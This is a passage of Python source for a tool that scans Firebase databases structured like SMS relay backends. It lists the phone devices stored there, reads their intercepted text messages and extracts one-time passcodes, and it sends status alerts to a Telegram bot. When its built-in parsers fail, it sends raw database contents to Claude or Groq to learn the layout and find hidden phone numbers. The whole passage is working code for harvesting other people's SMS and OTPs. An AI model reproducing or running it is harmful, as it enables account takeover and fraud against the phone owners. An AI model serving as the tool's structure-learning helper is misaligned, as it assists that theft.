    ghost_count = sum(1 for e in entries if e.is_ghost)

    # ── Step 5: Save if confidence is adequate ───────────────
    if confidence >= 0.50 and (real_count + ghost_count) > 0:
        save_learned_pattern(base, pattern)
        saved_note = "✅ Pattern saved — AI won't call again for this DB"
    else:
        saved_note = f"⚠️ Not saved (confidence={confidence:.0%}, devices={real_count+ghost_count})"

    # ── Step 6: Telegram alert with confidence score ─────────
    conf_bar  = "█" * int(confidence * 10) + "░" * (10 - int(confidence * 10))
    conf_pct  = f"{confidence:.0%}"
    conf_icon = "🟢" if confidence >= 0.8 else ("🟡" if confidence >= 0.5 else "🔴")

    alert_msg = (
        f"🧠 <b>New Firebase Structure Learned!</b>\n\n"
        f"🗄 <b>Database:</b> <code>{_host_slug(base)}</code>\n"
        f"🤖 <b>AI Used:</b> {ai_used}\n"
        f"🔖 <b>Pattern:</b> {pattern.get('pattern_id','AI-?')}\n"
        f"📱 <b>SMS path:</b> <code>{pattern.get('sms_root','?')}</code>\n"
        f"📞 <b>Phone field:</b> {pattern.get('phone_field') or '❌ Not stored'}\n"
        f"💬 <b>Body field:</b> <code>{pattern.get('sms_body_field','?')}</code>\n"
        f"📊 <b>Devices:</b> {len(entries)} total · 🟢 {real_count} real · 👻 {ghost_count} ghost\n\n"
        f"{conf_icon} <b>Confidence:</b> {conf_pct}\n"
        f"<code>[{conf_bar}]</code>\n\n"
        f"📝 {pattern.get('notes','')}\n"
        f"{saved_note}"
    )
    tg_alert(alert_msg, bot_token, admin_ids)

    return entries, pattern, None


# ═══════════════════════════════════════════════════════════════
# ANTHROPIC GHOST ANALYSIS  (admin-only, deep investigation)
# ═══════════════════════════════════════════════════════════════

async def ai_analyze_ghost(
        device_id: str,
        base: str,
        raw_data: dict,
        anthropic_key: str = None,
        groq_key: str = None,
        groq_model: str = None,
) -> dict:
    """
    Analyze a ghost device using AI.
    Returns dict with: possible_number, likely_active, confidence, recommended_action, notes
    """
    g_key = groq_key or GROQ_API_KEY
    a_key = anthropic_key or ANTHROPIC_KEY

    ghost_prompt = f"""You are analyzing a ghost device in a Firebase SMS relay system.
A ghost device has no resolved phone number. Analyze the raw Firebase data below and determine:
1. Is there a possible phone number hidden somewhere?
2. Is this device likely active or dead?
3. What path should we probe for a phone number?

Device ID: {device_id}
Raw Firebase data sample:
{json.dumps(raw_data, indent=2, default=str)[:4000]}

Return ONLY valid JSON:
{{
  "possible_number": "phone number or null",
  "possible_number_path": "firebase path or null",
  "likely_active": true,
  "confidence": 0.75,
  "recommended_action": "probe / mark_dead / manual_check",
  "notes": "brief explanation"
}}"""

    result = {
        "possible_number": None,
        "possible_number_path": None,
        "likely_active": False,
        "confidence": 0.0,
        "recommended_action": "manual_check",
        "notes": "AI analysis failed",
    }

    # Prefer Anthropic for ghost analysis (deeper reasoning)
    if a_key:
        try:
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                    f"{ANTHROPIC_BASE}/messages",
                    headers={
                        "x-api-key":         a_key,
                        "anthropic-version": "2023-06-01",
                        "Content-Type":      "application/json",
                    },
                    json={
                        "model":      "claude-haiku-4-5",
                        "max_tokens": 500,
                        "messages":   [{"role": "user", "content": ghost_prompt}],
                    },
                    timeout=aiohttp.ClientTimeout(total=30),
                ) as r:
                    if r.status == 200:
                        data    = await r.json(content_type=None)
                        content = data["content"][0]["text"].strip()
                        content = re.sub(r'^```[a-z]*\n?', '', content)
                        content = re.sub(r'\n?```$', '', content)
                        result  = json.loads(content)
                        result["ai_used"] = "Anthropic/claude-haiku-4-5"
                        return result
        except Exception:
            pass

    # Fallback to Groq
    if g_key:
        try:
            model   = groq_model or GROQ_MODELS["fast"]
            pattern = await _call_groq(ghost_prompt, g_key, model)
            pattern["ai_used"] = f"Groq/{model}"
            return pattern
        except Exception:
            pass

    return result


# ═══════════════════════════════════════════════════════════════
# MAIN DETECTOR
# ═══════════════════════════════════════════════════════════════

async def _detect_and_parse(
        sess, base, api_key=None,
        groq_key=None, groq_model=None, anthropic_key=None,
        bot_token=None, admin_ids=None,
):
    # ── Try learned pattern first ─────────────────────────────
    learned = load_learned_pattern(base)
    if learned:
        entries = await _parse_learned(sess, base, learned, api_key)
        if entries:
            return entries, f"AI-{learned.get('pattern_id','?')}", None

    root = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
    if not isinstance(root, dict):
        err = "Cannot connect or access denied"
        tg_alert(
            f"❌ <b>Firebase Parse Failed</b>\n<code>{_host_slug(base)}</code>\n{err}",
            bot_token, admin_ids
        )
        return [], "?", err

    root_keys = set(root.keys())

    if "All_Users" in root_keys:
        au_sh   = await fb_get(sess, f"{base}/All_Users.json?shallow=true", api_key=api_key) or {}
        au_keys = set(au_sh.keys()) if isinstance(au_sh, dict) else set()
        if "simDetails" in au_keys:
            rows = await _parse_A3(sess, base, api_key)
            if rows: return rows, "A3", None
        if "DeviceInfo" in au_keys and "simDetails" not in au_keys:
            rows = await _parse_A2(sess, base, api_key)
            if rows: return rows, "A2", None
        if "sms" in au_keys:
            rows = await _parse_I(sess, base, api_key)
            if rows: return rows, "I", None

    ns_candidates = [k for k in root_keys if k not in _FB_SYSTEM_KEYS
                     and k not in ("user_sms","user_data","user_list","messages",
                                   "smsLogs","registeredDevices","Sms","csc",
                                   "All_Users","sms_forward","callForwarding",
                                   "admin","status","register","history")]
    for rk in ns_candidates[:5]:
        probe = await fb_get(sess, f"{base}/{rk}/All_User/SimINFO.json?shallow=true", api_key=api_key)
        if isinstance(probe, dict) and probe:
            rows = await _parse_A(sess, base, ns_candidates, api_key)
            if rows: return rows, "A", None
            break

    if "user_sms" in root_keys and "user_data" in root_keys:
        rows = await _parse_G(sess, base, api_key)
        if rows: return rows, "G", None

    if "user_sms" in root_keys:
        sh   = await fb_get(sess, f"{base}/user_sms.json?shallow=true", api_key=api_key) or {}
        rows = [_ghost(d, base, f"{base}/user_sms/{d}", "", struct_type="G")
                for d in (sh if isinstance(sh, dict) else {}) if d not in _FB_SYSTEM_KEYS]
        if rows: return rows, "G", None

    if "messages" in root_keys:
        rows = await _parse_H(sess, base, api_key)
        if rows: return rows, "H", None

    if "smsLogs" in root_keys:
        rows = await _parse_J(sess, base, api_key)
        if rows: return rows, "J", None

    if "csc" in root_keys:
        rows = await _parse_K(sess, base, api_key)
        if rows: return rows, "K", None

    if "Sms" in root_keys:
        rows = await _parse_root_sms(sess, base, api_key)
        if rows: return rows, "I2", None

    rows = await _fallback_scan(sess, base, root, api_key)
    if rows: return rows, "Z", None

    # ── AI Fallback ───────────────────────────────────────────
    gk = groq_key or GROQ_API_KEY
    ak = anthropic_key or ANTHROPIC_KEY
    if gk or ak:
        print(f"[fb_parser] All patterns failed — AI fallback for {base}")
        entries, pattern, err = await ai_learn_structure(
            base, api_key, gk, groq_model, ak, bot_token, admin_ids
        )
        if entries:
            return entries, f"AI-{pattern.get('pattern_id','1')}", None
        if err:
            return [], "AI-FAIL", f"AI fallback failed: {err}"

    # ── Total failure alert ───────────────────────────────────
    tg_alert(
        f"❌ <b>Parse Failed — No Structure Found</b>\n"
        f"<code>{_host_slug(base)}</code>\n"
        f"Root keys: {', '.join(sorted(root_keys)[:8])}\n"
        f"Tried all known patterns (A/A2/A3/G/H/I/J/K/Z) + AI fallback.\n"
        f"Configure AI key via /admin → ⚙ System → 🤖 AI Config",
        bot_token, admin_ids
    )
    return [], "?", "No SMS data found in any known structure"


# ═══════════════════════════════════════════════════════════════
# PUBLIC API
# ═══════════════════════════════════════════════════════════════

async def parse_db(url: str, api_key: str = None, groq_key: str = None):
    base = url.replace("/.json","").replace(".json","").rstrip("/")
    async with aiohttp.ClientSession() as sess:
        rows, _, _ = await _detect_and_parse(sess, base, api_key, groq_key)
    return rows


async def parse_db_full(
        url: str,
        api_key: str = None,
        groq_key: str = None,
        groq_model: str = None,
        anthropic_key: str = None,
        bot_token: str = None,
        admin_ids: list = None,
):
    base = url.replace("/.json","").replace(".json","").rstrip("/")
    async with aiohttp.ClientSession() as sess:
        return await _detect_and_parse(
            sess, base, api_key, groq_key, groq_model, anthropic_key, bot_token, admin_ids
        )


async def fetch_latest_sms(entry: "DeviceEntry", api_key: str = None, pattern: dict = None):
    if not entry.sms_path:
        return None
    bf = pattern.get("sms_body_field")   if pattern else None
    sf = pattern.get("sms_sender_field") if pattern else None
    tf = pattern.get("sms_time_field")   if pattern else None
    try:
        async with aiohttp.ClientSession() as sess:
            node = await fb_get(
                sess,
                f"{entry.sms_path}.json?orderBy=%22%24key%22&limitToLast=20",
                api_key=api_key
            )
            if not isinstance(node, dict):
                node = await fb_get(sess, f"{entry.sms_path}.json", api_key=api_key)
            if not isinstance(node, dict):
                return None
            sms_entry, _ = latest_sms(node, bf, sf, tf)
            if not sms_entry:
                return None
            body, sender, ts = norm_sms(sms_entry, bf, sf, tf)
            if not body:
                return None
            otp = re.search(r'\b(\d{4,8})\b', body)
            return {"number": entry.number, "sender": sender, "message": body,
                    "time": ts, "otp": otp.group(1) if otp else None}
    except Exception:
        return None


async def fetch_sms_history(
        entry: "DeviceEntry",
        limit: int = 50,
        api_key: str = None,
        pattern: dict = None,
) -> list:
    if not entry.sms_path:
        return []
    bf = pattern.get("sms_body_field")   if pattern else None
    sf = pattern.get("sms_sender_field") if pattern else None
    tf = pattern.get("sms_time_field")   if pattern else None
    try:
        async with aiohttp.ClientSession() as sess:
            node = await fb_get(
                sess,
                f"{entry.sms_path}.json?orderBy=%22%24key%22&limitToLast={limit}",
                api_key=api_key
            )
            if not isinstance(node, dict):
                node = await fb_get(sess, f"{entry.sms_path}.json", api_key=api_key)
            if not isinstance(node, dict):
                return []
            results = []
            for _v, _k, body, sender, ts in all_sms_sorted(node, bf, sf, tf):
                otp = re.search(r'\b(\d{4,8})\b', body)
                results.append({"key": _k, "sender": sender, "message": body,
                                 "time": ts, "otp": otp.group(1) if otp else None})
            return results[:limit]
    except Exception:
        return []


# ═══════════════════════════════════════════════════════════════
# STANDALONE TEST
# ═══════════════════════════════════════════════════════════════

async def _test_main():
    if len(sys.argv) < 2:
        print("Usage: python3 fb_parser.py <url> [api_key]")
        sys.exit(1)
    url     = sys.argv[1]
    api_key = sys.argv[2] if len(sys.argv) > 2 else None
    entries, stype, err = await parse_db_full(url, api_key)
    if err:
        print(f"❌ ({stype}): {err}"); return
    real   = [e for e in entries if not e.is_ghost]
    ghosts = [e for e in entries if e.is_ghost]
    print(f"✅ Pattern [{stype}] | {len(entries)} devices | 🟢 {len(real)} real | 👻 {len(ghosts)} ghost")
    for e in real[:10]:
        print(f"  🟢 {e.number}  {e.carrier}  {e.device_name}")
    if entries:
        history = await fetch_sms_history(entries[0], limit=3, api_key=api_key)
        for s in history:
            print(f"  [{s['time']}] {s['sender']} → {s['message'][:80]}"
                  + (f" 🎯{s['otp']}" if s['otp'] else ""))


if __name__ == "__main__":
    asyncio.run(_test_main())
